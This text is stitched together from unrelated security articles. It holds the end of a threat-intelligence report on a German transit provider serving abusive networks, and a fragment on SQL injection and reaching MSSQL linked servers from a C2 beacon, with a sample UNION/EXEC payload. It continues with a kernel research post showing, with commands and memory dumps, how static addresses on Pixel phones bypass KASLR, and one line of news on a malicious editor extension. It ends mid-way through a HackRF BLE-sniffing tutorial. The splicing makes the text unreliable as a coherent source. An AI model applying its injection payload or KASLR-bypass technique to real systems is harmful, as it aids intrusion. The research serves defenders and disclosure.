Pfcloud UG. (Source:* In June 2024, CORRECTIV, a German non-profit investigative journalism organization, met with aurologic CEO, Joseph Hofmann at his office in Langen to discuss Qurium’s findings that data traffic from Tnsecurity Ltd and other companies in Aeza’s sphere of influence ran through aurologic’s infrastructure, leveraging its connectivity to global internet providers and supporting the Doppelgänger disinformation campaign. Hofmann maintained that he was unaware of any of his customers supporting the campaign, but appeared surprised when shown a link to a fake news article that led to his organization. He argued that this did not constitute definitive proof and insisted that only formal contact from authorities would prompt action. Hofmann describes his situation as a business dilemma, stating, “I can kick everyone out, but then at some point I won’t make any sales,” and that is why he waits for law enforcement correspondence.aurologic’s sustained relationships with multiple TAEs strain the boundaries of plausible negligence. Its continued role in providing upstream transit for Aeza International Ltd, despite US and UK sanctions, suggests a reactive posture focused on legal compliance rather than risk avoidance. Since aurologic operates under German jurisdiction, it may not be violating domestic law. On July 1, 2025, Joseph Hofmann, under the username “jh_aurologic”, publicly defended the company’s position on the LowEndTalk forum (), claiming the customer under review was  Aeza Group LLC. As of this writing, aurologic is not an upstream provider for Aeza Group LLC (AS216246), but remains a major upstream provider for Aeza International Ltd (AS210644).*: aurologic CEO Joseph Hofmann commenting on the situation surrounding Aeza Group LLC (Source:* The distinction between oversight and permissive policy is further blurred by the ease and pace at which fraudulent downstream providers rebrand by leveraging obscure or offshore entities, cycling through prefixes, and establishing new LIRs. This pattern was exemplified in a case documented by Spamhaus, which detailed a now-defunct network of TAEs all operating behind layers of decoy ISPs and ultimately routed through aurologic (see ).*: The Spamhaus Project points out aurologic’s proximity to malicious networks (Source:* X, formerly knows as Twitter)On April 7, 2025, Spamhaus again cited aurologic, describing it as an ISP with a “considerable history of bulletproof hosting proliferation” in relation to its provision of connectivity 49.3 Networking LLC (AS399979). Hofmann publicly disputed the characterization, asserting that the company “has no considerable history of bulletproof hosting” and that employees “react according to applicable law” when receiving abuse reports (see ). In the same thread, Hofmann engaged in a broader discussion with security researcher “Gi7w0rm” regarding aurologic’s continued service to Aeza despite its founders’ arrests and sustained malicious activity. Hoffman outlined his broader stance on maintaining neutrality toward the activity occurring across aurologic’s network, describing neutrality as “the art of being impartial.” This position suggests a broader posture of deliberate non-interference in the name of neutrality, which in practice could explain the persistence of high-risk and abusive networks under aurologic’s infrastructure.*: Joseph Hofmann’s public responses to Spamhaus’ post regarding 49.3 Networking LLC (Source:* X, formerly known as Twitter)From the perspective of impacted victims or network defenders, the difference between negligence and complicity is often meaningless if threat actors are enabled to operate freely. When transit providers like aurologic fail to regularly investigate recurring abuse, whether out of resource constraints, business tolerance, or the legal limitations placed on them, the effect is the same: malicious infrastructure remains globally accessible. Under current EU and German law, transit providers are not generally required to proactively monitor or police customer activity unless they possess actual knowledge of illegal use.aurologic has alluded to strict German data-protection obligations as one of many reasons for avoiding actions such as direct traffic inspection. While that is a legitimate concern, overreliance on that stance can mask operational complacency. The posture is also reflected in the company’s own Terms of Service, which explicitly invoke the EU’s Digital Services Act (DSA) to disclaim liability for content “stored, processed, or transmitted on customer-leased infrastructure,” provided the company is unaware of its existence or does not “actively support illicit use.” Abuse reports are to be verified, forwarded to the customer, and, if unresolved within 24 hours, may result in null-routing of the affected IP address. Only in “rare cases posing higher risks” does aurologic reserve the right to take proactive measures.The company’s public abuse-handling and authority-request policies follow a similar reactive model. All complaints must be submitted via a designated email channel () and include a full evidentiary record. Invalid or incomplete submissions are dismissed automatically. These procedures illustrate how aurologic's operational structure aligns with the reactive, notice-based compliance regime established by the Digitale-Dienste-Gesetz (DDG) and DSA. The company’s obligations begin only once it receives valid notice of abuse, and its enforcement options are further bound by procedural and jurisdictional limits. This framework not only defines but effectively constrains how far a provider can intervene, creating an environment where inaction remains legally defensible even amid persistent abuse. In this sense, aurologic’s abuse handling can be seen as a product of the broader European intermediary-liability model, which tends to prioritize legal defensibility over proactive security stewardship.In practice, this means a provider like aurologic remains compliant with national law even when its network is repeatedly leveraged by threat actors, so long as it can claim lack of awareness of intent. The legal framework effectively absolves transit and hosting providers from responsibility for downstream misuse of their services, allowing malicious infrastructure to persist as long as it operates within the boundaries of plausible deniability.The uncertainty over whether upstream providers are merely negligent or knowingly complicit underscores a central challenge in combating infrastructure abuse. Larger transit providers often defend their practices by citing contractual compliance and legal obligations, yet this narrow framing leaves ample room for high-risk networks to operate undeterred. For the cybersecurity community, regulators, and policymakers, the question is not only whether negligence or permissiveness is at play, but also how to impose accountability when routing decisions repeatedly sustain threat actors engaged in disinformation, cybercrime, and malware distribution.Use Recorded Future Threat Intelligence: Recorded Future customers can proactively mitigate threats originating from malicious networks, such as those discussed in this report, by operationalizing Recorded Future Intelligence Cloud data. This can be achieved by leveraging continuously updated Risk Lists and by blocklisting validated malicious IP addresses to prevent internal communication with malicious infrastructure.Implement Robust Network Security Controls: Configure perimeter security appliances and internal network defenses to block traffic originating from the ASNs identified in this report, unless there is a clearly defined business justification for permitting such traffic.Insikt Group assesses with high confidence that aurologic is likely to remain a central hub for TAE networks. Despite growing public pressure and international sanctions against its downstream customers, aurologic continues to operate within the bounds of its legal obligations, providing upstream connectivity that is ultimately enabling the highest concentrations of malicious activity observed within Recorded Future Network Intelligence. This, combined with the absence of coordinated regulatory enforcement, suggests that the conditions enabling high-risk networks to persist under its infrastructure are unlikely to change.While the exact reason for aurologic’s continued prominence among these networks cannot be confirmed, the company’s public defense of, and ongoing provision of services to, Aeza despite multiple international sanctions, coupled with its publicly stated position of neutrality toward activity on its network, has likely reinforced its reputation among TAEs as a dependable upstream provider.This case also reflects the greater question at hand within the hosting ecosystem: At what point does neutrality or persistent inaction in the face of systemic abuse become indistinguishable from complicity? As long as transit providers are able to maintain legal compliance while continuing to service networks repeatedly associated with malicious activity, the responsibility for intervention remains displaced onto their customers, even when those customers are the source of the abuse. Until these gaps in compliance, accountability, and proactive oversight are addressed, TAEs will continue to thrive.Appendix A: Active Networks Linked to aurologicGlobal-Data System IT Corporation (SWISSNET 02)Femo IT Solutions LimitedVladylsav Naumets (PrivateNetwork.ltd)MXCLOUD Ltd (downstream of WAIcore)IP-Projects GmbH & Co.

The nature of SQL injection itself is unstable. Complex queries are prone to syntax errors when injected with malicious input, especially if the application constructs dynamic queries that are vary based on user input or session state.Since the  query is part of a SQL injection payload, the syntax, injection context, or sanitization might be altering the intended query. For instance, if the injection appends  without ensuring proper execution context, it might not behave as expected.The key aspect is the placement of the injection itself. The behavior of the injected payload depends on where the injection occurs within the application's query.For example, the following query becomes invalid because  does not return a result set directly compatible with a SELECT column FROM table WHERE id = 1 UNION SELECT EXEC sp_linkedservers;These factors contributes to the instability of executing SQL queries via sqlmap.However, as we engage with the MSSQL from the C2 framework, we avoid the previously mentioned factors. The BOF instantiates a new MSSQL connection internally, by using the context of the machine account or any other manually specified user. This connection is independent of any form of vulnerability or exploitation. This way, the connection is stable, which ensures better results. When operating from the C2, we are restricted only by the user context, from where the BOF is executed, which in our case is not highly privileged.

Using the beacon, we connect to the database as the machine account of the server. On the other hand, if we use the sqlmap shell, we will operate from the context of , which we already know is highly privileged. Often machine accounts do not have high privileges over local and remote SQL servers, so I think the choice is obvious here.There are many ways to manually engage with the linked server.

# Introduction

I've recently been researching Pixel kernel exploitation and as part of this research I found myself with an excellent arbitrary write primitive…but without a KASLR leak. As necessity is the mother of all invention, on a hunch, I started researching the Linux kernel linear mapping.

# The Linux Linear Mapping

The linear mapping is a region in the kernel virtual address space that is a direct 1:1 unstructured representation of physical memory. Working with Jann, I learned how the kernel decided where to place this region in the virtual address space. To make it possible to analyze kernel internals on a rooted phone, Jann wrote a tool to call tracing BPF's privileged BPF\_FUNC\_probe\_read\_kernel helper, which by design permits arbitrary kernel reads. The code for this is available here. The linear mapping virtual address for a given physical address is calculated by the following macro:

#define phys\_to\_virt(x) ((unsigned long)((x) - PHYS\_OFFSET) \| PAGE\_OFFSET)

On Arm64 PAGE\_OFFSET is simply:

#define VA\_BITS (CONFIG\_ARM64\_VA\_BITS)

#define \_PAGE\_OFFSET(va) (-(UL(1) << (va)))

#define PAGE\_OFFSET (\_PAGE\_OFFSET(VA\_BITS))

As CONFIG\_ARM64\_VA\_BITS is 39 on Android, it’s easy to calculate PAGE\_OFFSET = 0xffffff8000000000.

PHYS\_OFFSET is calculated by:

extern s64 memstart\_addr;

/\\* PHYS\_OFFSET - the physical address of the start of memory. \*/

#define PHYS\_OFFSET ({ VM\_BUG\_ON(memstart\_addr & 1); memstart\_addr; })

memstart\_addr is an exported variable that can be looked up in /proc/kallsyms. Using Jann’s bpf\_arb\_read program, it’s easy to see what this value is:

tokay:/ # grep memstart /proc/kallsyms

ffffffee6d3b2b20 D memstart\_addr

ffffffee6d3f2f80 r \_\_ksymtab\_memstart\_addr

ffffffee6dd86cc8 D memstart\_offset\_seed

tokay:/ # cd /data/local/tmp

tokay:/data/local/tmp # ./bpf\_arb\_read ffffffee6d3b2b20 8 <

ffffffee6d3b2b20 00 00 00 80 00 00 00 00 \|........\|

tokay:/data/local/tmp #

This value (0x80000000) doesn’t look particularly random. In fact, memstart\_addr was theoretically randomized on every boot, but in practice this hasn’t happened for a while on arm64. In fact as of commit 1db780bafa4c it’s no longer even theoretical - virtual address randomization of the linear map is no longer a supported feature in arm64 Linux kernel.

The systemic issue is that memory can (theoretically) be hot plugged in Linux and on Android because of CONFIG\_MEMORY\_HOTPLUG=y. This feature is enabled on Android due to its usage in VM memory sharing. When new memory is plugged into an already running system, it must be possible for the Linux kernel to address this new memory, including adding it onto the linear map. Android on arm64 uses a page size of 4 KiB and 3-level paging, which means virtual addresses in the kernel are limited to 39 bits, unlike typical X86-64 desktops which use 4-level paging and have 48 bits of virtual address space (for kernel and userspace combined); the linear map has to fit within this space further shrinking the area available for it. Given that the maximum amount of theoretical physical memory is far larger than the entire possible linear map region range, the kernel places the linear map at the lowest possible virtual address so it can theoretically be prepared to handle exorbitant (up to 256GB) quantities of hypothetical future hot-plugged physical memory. While it is not technically necessary to choose between memory hot-plugging support and linear map randomization, the Linux kernel developers decided not to invest the engineering effort to implement memory hot-plugging in a way that preserves linear map randomization.

So we now know that PHYS\_OFFSET will always be 0x80000000, and thusly, the phys\_to\_virt calculation becomes purely static - given any physical address, you can calculate the corresponding linear map virtual address by the following formula:

#define phys\_to\_virt(x) ((unsigned long)((x) - 0x80000000) \| 0xffffff8000000000)

# Kernel physical address non-randomization

Compounding this issue, it also happens that on Pixel phones, the bootloader decompresses the kernel itself at the same physical address every boot: 0x80010000.

tokay:/ # grep Kernel /proc/iomem

80010000-81baffff : Kernel code

81fc0000-8225ffff : Kernel data

Theoretically, the bootloader can place the kernel at a random physical address every boot, and many (but not all) other phones, such as the Samsung S25, do this. Unfortunately, Pixel phones are an example of a device that simply decompresses the kernel at a static physical address.

# Calculating static kernel virtual addresses

This means that we can statically calculate a kernel virtual address for any kernel .data entry. Here’s an example of me computing that linear map address for the modprobe\_path string in kernel .data on a Pixel 9:

tokay:/ # grep modprobe\_path /proc/kallsyms

ffffffee6ddf2398 D modprobe\_path

tokay:/ # grep stext /proc/kallsyms

ffffffee6be10000 T \_stext

//Offset from kernel base will be 0xffffffee6ddf2398 - 0xffffffee6be10000 = 0x1fe2398

//Physical address will be 0x80010000 + 0x1fe2398 = 0x81ff2398

//phys\_to\_virt(0x81ff2398) = 0xffffff8001ff2398

tokay:/ # /data/local/tmp/bpf\_arb\_read ffffff8001ff2398 64

ffffff8001ff2398 00 73 79 73 74 65 6d 2f 62 69 6e 2f 6d 6f 64 70 \|.system/bin/modp\|

ffffff8001ff23a8 72 6f 62 65 00 00 00 00 00 00 00 00 00 00 00 00 \|robe............\|

\[ zeroes \]

tokay:/ # reboot sethjenkins@sethjenkins91:~$ adb shell

tokay:/ $ su

tokay:/ # /data/local/tmp/bpf\_arb\_read ffffff8001ff2398 64

ffffff8001ff2398 00 73 79 73 74 65 6d 2f 62 69 6e 2f 6d 6f 64 70 \|.system/bin/modp\|

ffffff8001ff23a8 72 6f 62 65 00 00 00 00 00 00 00 00 00 00 00 00 \|robe............\|

\[ zeroes \]

tokay:/ #

So modprobe\_path will always be accessible at the kernel virtual address 0xffffff8001ff2398, in addition to its normal mapping, even with KASLR enabled. In practice, on Pixel devices you can derive a valid virtual address for a kernel symbol by calculating its offset and simply adding a hardcoded static kernel base address of 0xffffff8000010000. In short, instead of breaking the KASLR slide, it is possible to just use 0xffffff8000010000 as a kernel base instead.

The linear mapping memory is even mapped rw for any kernel .data regions. The only consolation that makes using this address slightly less effective than the traditional method of leaking the KASLR slide is that .text regions are not mapped executable - so an attacker cannot use this base for e.g. ROP gadgets or more generally PC control. But oftentimes, a Linux kernel attacker’s goal isn’t arbitrary code execution in kernel context anyway - arbitrary read-write is the more frequently desired primitive.

# Impact on devices with kernel physical address randomization

Even on devices where the kernel location is randomized in the physical address space, linear mapping non-randomization still softens the kernel considerably to attempts at exploitation. This is particularly because techniques that involve spraying memory (either kernel structures or even userland mmap’s!) can land at predictable physical addresses - and those physical addresses are easily referenceable in kernel virtual address space through the linear map. That potentially gives an attacker a methodology for placing kernel data structures or even simply attacker-controlled userland memory at a known kernel virtual address. I created a simple program that allocated (via mmap and page fault) a substantial quantity (~5 GB) of physical memory on a Samsung S23, then used /proc/pagemap to create a list of which physical page frame numbers (pfns) were allocated. I ran this program 100 times (rebooting in between each time), then counted how often each pfn appeared across the 100 execution cycles. The set of pfns and their counts for how often they appeared were then converted into an image where each pfn is represented by a single pixel. The brighter the green of a pixel, the more often that page was attacker controlled, with a white pixel representing a pfn that was allocated every time. A black pixel represents a pfn that was never allocated - often because those pfn numbers are not mapped to physical memory or because they are used every time in a deterministic way. A big thank you to Jann Horn for developing the tool to create this image from the data that I collected.

This data exemplifies the non-homogenous reliability of pfn allocation to userland mappings, albeit on a device that was only just rebooted. There are ranges of pfns that are allocated quite reliably, and other ranges that are quite unreliable (but still occasionally used). For example, here’s a range of pfns surrounding one of the pages that was allocated 100 times in a row. I suspect this sample is representative of the practical reliability of this technique for placing desired data at a known kernel address for at least a newly rebooted device.

While reliability may suffer on a device that hasn’t rebooted in some time, it remains high enough to be inviting to real-world attackers. Being able to place arbitrarily readable and writable data at a known kernel virtual address is a powerful exploitation primitive as an attacker can much more easily forge kernel data structures or objects and, for example, emplace pointers to those objects in heap sprays attacking UAF issues.

# The Prognosis

I reported these two separate issues, lack of linear map randomization, and kernel lands at static physical address in Pixel, to the Linux kernel team and Google Pixel respectively. However both of these issues are considered intended behavior. While Pixel may introduce randomized physical kernel load addresses at some later point as a feature, there are no immediate plans to resolve the lack of randomization of the Linux kernel’s linear map on arm64.

# Conclusion

Three years ago, I wrote on the state of x86 KASLR and noted how “it is probably time to accept that KASLR is no longer an effective mitigation against local attackers and to develop defensive code and mitigations that accept its limitations.” While it remains true that KASLR should not be trusted to prevent exploitation, particularly in local contexts, it is regrettable that the attitude around Linux KASLR is so fatalistic that putting in the engineering effort to preserve its remaining integrity is not considered to be worthwhile. The joint effect of these two issues dramatically simplified what might otherwise have been a more complicated and likely less reliable exploit. While side-channel attacks do impact the long-term viability of KASLR on all architectures, it is notable that Project Zero and the Google Threat Intelligence Groupp have yet to see a hardware side-channel attack for bypassing KASLR on Android in the wild. Additionally, KASLR still plays an important role in mitigating any remote kernel exploitation attempts. It is valuable from a security in-depth perspective to recognize the impact KASLR has on exploit complexity and reliability in real-world scenarios. In the future, we hope to see changes to the Linux kernel linear mapping and memory hot-plugging implementation to make this a less inviting target for attackers. Randomizing the location of the linear map in the virtual address space, increasing the entropy in physical page allocation, and randomizing the location of the kernel in the physical address space are all concrete steps that can be taken that would improve the overall security posture of Android, the Linux kernel, and Pixel.]]></content:encoded></item><item><title>Malicious VSX Extension &quot;SleepyDuck&quot; Uses Ethereum to Keep Its Command Server Alive</title><link>https://thehackernews.com/2025/11/malicious-vsx-extension-sleepyduck-uses.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsNAYBUN0RQ2z5BWnN5wrHTjB-XMx0nYPvJ5PMwCjxNk6CVExZCv401_jX_vaktwnLz8B3owRjupOCNIH7s2lbATDXkpMWwounrKb1OaiINgihVNcp_Mc17Wt7y2-LJBiEOk04hyphenhyphen6WlNKg76W5-f3fx2SDPtSSHQSO5gPu0E4V5RmzDEH0WcdpmAzXG0iB/s1600/soladity.jpg" length="" type=""/><pubDate>Mon, 3 Nov 2025 18:08:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have flagged a new malicious extension in the Open VSX registry that harbors a remote access trojan called SleepyDuck.

This makes it the go-to technology for a vast ecosystem of Internet of Things (IoT) devices, including fitness trackers, smart home sensors, medical monitors, and asset tracking tags. From a security and reverse-engineering perspective, the ability to "listen in" on these communications is invaluable. It allows us to understand how devices talk to each other, discover proprietary protocols, and identify potential security vulnerabilities.A Software Defined Radio (SDR) is a radio communication system where components that have been typically implemented in hardware (e.g., mixers, filters, modulators, demodulators) are instead implemented in software on an embedded system. In essence, an SDR acts as a highly versatile digital receiver. It tunes to a wide spectrum of frequencies and streams the raw radio data to a host computer, which can then process it to decode almost any wireless protocol, including BLE.This blog post describes a methodology to sniff BLE communications using a relatively inexpensive SDR such as the .By reading this post, you will learn BLE/SDR basics and how we overcame the three main challenges we encountered:How to handle the difference in transmit power on both ends of the BLE connectionHow to follow the channel hopping despite the USB latency (since we cannot listen to all channels simultaneously)How to deduce the channel hopping scheme without seeing the frame that initiates the connectionWe assume that the reader has some experience in C programming and basic math.Before describing our approach, we will first cover BLE protocol and SDR basics. Please be aware that the information given in this post applies to the BLE 5.0 specifications.The Bluetooth Low Energy protocol is organized in a stack of layers, similar to the OSI model for networking. In this post, we will focus on the , which sits directly on top of the Physical Layer (PHY). The LL is responsible for managing the radio state, including advertising, scanning, and establishing and maintaining connections. It defines the packet structure, channel hopping, and timing that we will be exploring in detail.The BLE link-layer protocol uses up to 40 radio channels, numbered from 0 to 39. Each channel is assigned its own frequency, and there are two types of channels:The  channels (numbered 37, 38, and 39) that serve as connection management (such as discovery and initiating connections)The  channels (numbered 0 to 36) that carry the actual connection data after it's establishedThe devices participating in a BLE connection exchange packets on the various channels. The general structure of a packet is as follows:The general structure of a PDU is as follows:Advertisement PDUs are exchanged on the advertisement channels, and Data PDUs are exchanged on the data channels.A BLE connection involves two roles:The : This is the device that initiates the connection (such as a smartphone or computer)The : This is the service we connect to (such as a smart lightbulb or heart rate sensor)The process of establishing the connection involves three phases:The Peripheral device that wants to accept connections broadcasts  packets at a regular interval (called the ) on the advertising channels in a round-robin fashion (i.e., on channel 37, then 38, then 39, then again 37, and so on).The Central device listens on the advertising channels to pick up  packets.When the Central device receives any  packets from a device it wants to connect to, it replies with a  packet to the  on the same advertising channel.📝  BLE connection establishment between two devicesLet's assume we've already found the Access Address () and the Connection Interval ()...The  packet contains some crucial information required for the subsequent data exchange. Here are the most important ones:The  for the Data PDUs that will be exchanged on the connectionThe  that specifies the interval at which the devices will exchange dataThe , , and  fields that specify the channel hopping schemeThere are two possible algorithms for the channel hopping scheme: is a simple algorithm that must be supported by all devices is a more complex algorithm that is used only when both devices participating in the connection support itIn this blog post, we will focus on  since it is the more widely used in practice.Once the Central and Peripheral devices have established a connection using the advertising channels, they switch to the data channels to exchange application data. This exchange is not a continuous stream but is structured into periodic bursts called . During these events, the devices wake up, exchange one or more data packets, and then go back to sleep to conserve power.In order to maintain a robust connection and avoid interference, BLE employs a channel hopping scheme, meaning the channel used changes for every connection event. Understanding how this data exchange is timed and how the channel hopping sequence is determined is fundamental to successfully sniffing an ongoing connection.Connection timing propertiesIn this section, we will focus on the connection event timings, enabling us to understand the channel hopping in the next section.Recall that the central and peripheral devices exchange packets during , which consist of a sequence of exchanges. Each exchange is initiated by the central device by sending a packet, then the peripheral device replies, then the central device initiates the next exchange, and so on, until the connection event is terminated.The time at which the first packet of a connection event is sent by the central device is called the  of this connection event. The time between two subsequent anchors is determined by the  negotiated in the  packet.There may be a small amount of  affecting the timing of anchors. In that case, the timing of subsequent anchors shall be determined relative to the actual time of the last anchor.📝  Anchors and connection eventsAnchor 2 happens at T + connInterval + smallJitterThen, Anchor 3 will be expected at T + connInterval + smallJitter + connIntervalAt each connection event, the data channel changes. When using  (as we assume), the picked channel depends on the following:The  and the  negotiated at the start of the connectionThe  (incremented at each connection event)The following schema describes the algorithm used to compute the channel number based on the AA and event counter.This section will cover SDR basics. Readers interested in more details are encouraged to read the excellent PySDR tutorials.The SDR listens to radio waves and converts them into a format that can be handled by the host, in a process called  that we will describe in more detail in the following section.The SDR device is commanded by the host (your PC) that instructs it to "tune" to an arbitrary frequency (called the ).Once the SDR is tuned to a frequency, it listens to the radio waves around that frequency and provides the host a stream of I and Q integer values, sampled at a specific interval (called the ).The core mechanism of the IQ sampling is taking this "raw" radio wave and converting it into the stream of IQ values.Joseph Fourier tells us that any signal can be represented as a sum of sine waves. To illustrate the concept, we will provide some examples of IQ sampling with radio sine waves to get the idea of what is done.A sine wave is characterized by its  (i.e., the frequency at which the signal "repeats itself"), its  (i.e., the "strength" of the signal), and its  (i.e., the time-shift relative to a pure sine wave).In order to do the IQ sampling, the SDR generates two sine wave signals:The  signal, which is a sine wave at the SDR's tuned frequencyThe  signal, which is the same sine wave as the  signal, except it's time-shifted by a quarter of a period (i.e., it "lags" behind the in-phase signal by 90°)For mathematical reasons, any sine wavecan be expressed as:But how areandrelated to? Let's make a few sample signals to find out.📝  The case where S(t) is exactly equal to the  signal. Relative to the  signal, the phase of S(t) is 0.In this example,, so in the context of,and.📝  The case where S(t) is a sine wave like the  signal, except it "leads" the  signal by 90°. Relative to the  signal, the phase of S(t) is 90° (or, in radians).In that example,(note the minus sign, since S(t) "leads" the in-phase signal, while the quadrature-phase "lags" behind the in-phase signal), so in the context of,and.We can imaginebeing a vector in the plane (with I being associated to the horizontal axis). Looking at these two examples, we see that the angle of the vector [I,Q] (relative to the horizontal axis) represents the phase of S(t), while its length represents the amplitude:In the first example, I=1 and Q=0, so the angle of [I,Q] is 0, which corresponds to the phase of S(t). The amplitude is 1, which also corresponds to the amplitude of S(t).In the second example, I=0 and Q=1, so the angle of [I,Q] is 90°, which corresponds to the phase of S(t). The amplitude is 1, which also corresponds to the amplitude of S(t).Based on these two simple examples, we have an intuition for the rule. It turns out that this generalizes to any amplitude and phase. This vector representation ofon the plane is called the  diagram.As we see, a radio sine wave at exactly the same frequency as the SDR tuning frequency will be represented by a  vector, whose angle and length represents the phase and amplitude of the sine wave.But what happens if our radio wave is a sine wave not exactly at the SDR tuned frequency? Let's say that our radio wave is a sine at frequency. The intuition here is that a shift in frequency can be thought of as a . Indeed, our phasor will "spin" in the positive (counter-clockwise) direction at a rate ofturns per second like this:Conversely, if the radio wave frequency is less than the SDR tuning frequency, the phasor will "spin" in the negative direction, with a speed proportional to the frequency difference.Now, we see that the IQ samples (and the phasor) contain all the information we need about the signal:Its  (the angle of the vector relative to the horizontal axis)Its  (the length of the vector)Its  to the SDR tuned frequency (the "spinning" speed)The SDR can capture a wide range of frequencies around its center frequency. When listening to a specific signal, we will tune our SDR to the frequency of this signal, but other signals may be present in the captured frequency range, polluting our data.For this reason, we usually apply a  to our IQ data to keep only the signals around the center frequency (we use a low-pass filter and not a pass-band filter, because recall that due to IQ sampling, a signal with the exact same frequency as the SDR center frequency will appear in the IQ data as a frequency of 0, i.e., a DC offset).The low-pass filter is some kind of moving-average on the IQ data that smoothes out the fast variations (corresponding to signals too distant from our center frequency) and keeps the signal that we need to focus on.📝  Filtering IQ signalListening on multiple channels simultaneously (aka: the "Super-power" of the SDR)We have already seen that the SDR listens to a wide range of frequencies around its center frequency. This is why we need filtering to eliminate other conflicting signals in the frequency range.But what if that could be used to our advantage? During BLE sniffing, due to channel hopping, it would be useful to be able to listen to multiple Bluetooth channels simultaneously. It turns out that this is possible, as long as all the channels are in the correct frequency range around the center frequency.Suppose our SDR is tuned to the frequency of 1000Hz (this is not a realistic value, but it is used in our example for the sake of simplicity). We record some IQ data, and we know that on this data there is a signal at 1001Hz.How do we listen to this 1001Hz signal without having to physically tune the SDR at 1001Hz? We will need to post-process our IQ data to get IQ data similar to what would have been obtained if the SDR was tuned at 1001Hz.Recall that, because the signal is at 1001Hz and our tuned frequency is at 1000Hz, the phasor obtained from the IQ data will "spin" at a rate of 1 turn per second in the positive direction (counter-clockwise).What would have been the phasor if the SDR was tuned to 1001Hz? It would be a constant vector. Therefore, to perform this kind of "software tuning", we will need to take our raw IQ data and apply a time-variant rotation of 1 turn per second in the  (clockwise). This corresponds to a frequency shift. The resulting IQ data will be similar to the data we would have obtained if the SDR was tuned to 1001Hz.In a nutshell, we "correct" in software the phasor rotation caused by the frequency difference to obtain a stable phasor as we would have obtained if we were tuned precisely to its frequency. Only then can we apply the low-pass filter.By this process, we see that from the same recorded IQ data, we can extract signals at various frequencies around our center frequency by:Applying a frequency shift to the data to "center" around our target signalApplying a low-pass filterThe BLE protocol employs GFSK (Gaussian Frequency Shift Keying) modulation, which is a kind of frequency modulation. Bits are transmitted at a fixed rate of 1 MHz, and the signal frequency determines the value of the bit: a signal frequency higher than the central frequency represents a 1, while a lower frequency represents a 0.In order to demodulate the signal (i.e., extract the 0s and 1s from the IQ data), we will first need to recover the frequency of the signal at each point in time. Recall that the frequency is simply the phase variation, so to compute the frequency at time T, we will need to compare (subtract) the phase at time T and at time T+1.The following figure shows the demodulation of a simple signal.We can see that to have a clear demodulation, we will need to sample the frequency curve precisely at the center of each bit. In order to find out precisely the centers of the bits, we will use the preamble. The general idea is to pre-compute an ideal preamble template and find out at which point in time the preamble template is the most similar possible to our incoming signal.📝  Preamble detectionThe following figure shows this process, we see that the maximum correlation is at the actual preamble start, at T=6.Once this is done, we can decode each bit by looking at the frequency at the center of the symbol.The  is a popular and affordable open-source SDR device. Its key appeal lies in its wide frequency range and its completely open-source design, covering both the hardware and the firmware. This openness allows researchers to not only use the device for a vast range of applications, but also to modify its firmware to implement custom features, a capability we leverage heavily in our approach.The HackRF can listen to signals in frequencies from 1 MHz to 6 GHz, but works best in the range 2 GHz-2.8 GHz, which is great because the BLE frequencies are in it.The IQ sampling rate and maximum bandwidth is 20 MHz. This means that we can listen simultaneously to multiple signals around our center frequency, from [center - 10 MHz] to [center + 10 MHz].There are three RX gain parameters that can be modified: , , and  gain. The RF and LNA gain operate right after the signal is received, but the VGA gain operates after converting the signal to IQ, just before the sampling.Later in this post, we will see how we implemented the AGC (Automatic Gain Control) in the HackRF firmware.The HackRF interacts with the Host using a  interface. There is a USB endpoint to perform control operations (such as setup, setting frequency, gain, and so on), and two bulk USB endpoints to carry respectively received and transmitted IQ samples.The HackRF employs an ARM processor with two cores,  and . The M0 core is dedicated to handling the IQ data flow. It spends its time moving IQ data between the transceiver and a shared buffer with the M4. The M4 core runs the rest of the firmware.The HackRF uses a  Analog Front-End and sends commands to it with .While the theory of BLE and SDRs provides a solid foundation, applying it to real-world sniffing presents a number of practical challenges that can quickly derail any attempt to capture a full communication. These problems stem from the physical realities of radio transmission, the performance limitations of a host-controlled SDR, and the stateful nature of the BLE protocol itself. In the following sections, we will detail the three main obstacles we needed to overcome.When sniffing the BLE connection between a central and peripheral devices, transmit power can vary a lot: the signal strength from the central device may be high, while the signal strength from the peripheral device may be low.Setting a low gain will enable capturing the packets from the phone correctly, but the packets from the peripheral devices will have an insufficient signal strength. Conversely, if we set a high gain, we will be able to correctly capture peripheral device packets, but phone packets will be clipped/distorted, impairing the demodulation process.Attempting to adjust the gain once the beginning of the packet is received using the USB interface will be too slow, due to the USB command latency.Channel switching latencyThe BLE protocol employs channel hopping at a fast rate. Attempting to follow the channel hopping from the host by sending commands to the HackRF via the USB interface would be too slow, again due to the USB command latency.Sniffing advertisement channelsThe BLE advertising channels are 37, 38, and 39. The frequencies of these channels are too far apart (> 20 MHz) for HackRF to be able to listen to more than one of them at the same time. Since the  packet can happen on any of the advertising channels, we will probably miss it and fail to catch the required parameters (notably, the Access Address that is required to compute the channel hopping).This section present the solutions to three challenges we encountered.Firmware-based Automatic Gain Control (AGC)The disparity in signal strength was tackled by the implementation of an Automatic Gain Control (AGC) to automatically adjust the input gain based on signal strength. In order to have a fast AGC, it needed to be implemented in the time-critical receive loop of the HackRF's firmware, thus entirely bypassing the high-latency USB connection.Unlike traditional continuous AGCs that constantly adapt the gain based on signal power, this implementation uses a one-shot approach triggered only when a packet is detected.The reason is simple: if the AGC keeps running during idle periods, it ends up amplifying noise, which leads to saturation and clipping as soon as a real packet arrives. Once the receiver is clipped, it’s impossible to estimate the correct gain in time for decoding. By freezing the gain during idle and only adjusting it at the start of a packet, the AGC can directly compute and apply the correct gain level so that the signal is stable as soon as possible.Let's now focus on the implementation details, by diving into the firmware function that handles the receiving mode:This code runs on the M4 core, but the  buffer and  struct are shared with the M0 core. The M0 core fills up the buffer by blocks of 32 bytes at a time, and increments  accordingly. When there is sufficient data () the data is sent to the host via USB bulk transfer.In order to have a fast AGC, it needs to be implemented in this loop, and executed on the M4 core. It cannot be executed on the M0 core since this core is too much time-constrained to be able to do any other thing besides copying IQ data.The AGC will need to start as fast as possible, so we will need to process each 32-byte block and feed it to the AGC function, so we insert this code at the start of our  loop:The  function repeats this process for each received packet:Sets the VGA gain to a baseline (low) value.Detect idle noise power level, and track it using a rolling averageWhen there is an increase in power such that the SNR is over a defined threshold, detects the start of a packet.Measure the power at the start of the packet, and use it to compute the optimal VGA gainApply the computed VGA gain, and update the noise power level under that new gain.When the SNR falls under a defined threshold, detects the end of a packet, and reset the VGA gain to the baseline value.In order to make the AGC more reactive, we also increased the SPI clock frequency in the HackRF firmware. The following picture shows the effect of the AGC, increasing the power when a packet is detected. The AGC takes effect a little after the beginning of the preamble, leaving ample 